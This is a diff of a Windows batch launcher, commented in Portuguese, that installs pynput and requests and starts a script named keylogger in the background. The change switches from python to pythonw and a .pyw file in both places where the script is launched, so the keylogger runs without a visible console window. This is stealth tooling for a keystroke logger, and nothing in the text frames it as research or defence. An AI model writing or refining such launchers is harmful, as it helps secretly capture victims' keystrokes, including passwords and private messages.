@@ -7,7 +7,7 @@ if %errorlevel% == 0 (
   rem Instale as bibliotecas necessárias
   python -m pip install requests pynput
   rem Rode o script em um novo processo em segundo plano
-  start /b python ./keylogger.py
+  start /b pythonw ./keylogger.pyw
   exit /b
 )
 
@@ -26,4 +26,4 @@ rem Instale as bibliotecas necessárias
 python -m pip install requests pynput
 
 rem Rode o script em um novo processo em segundo plano
-start /b python ./keylogger.py
+start /b pythonw ./keylogger.pyw
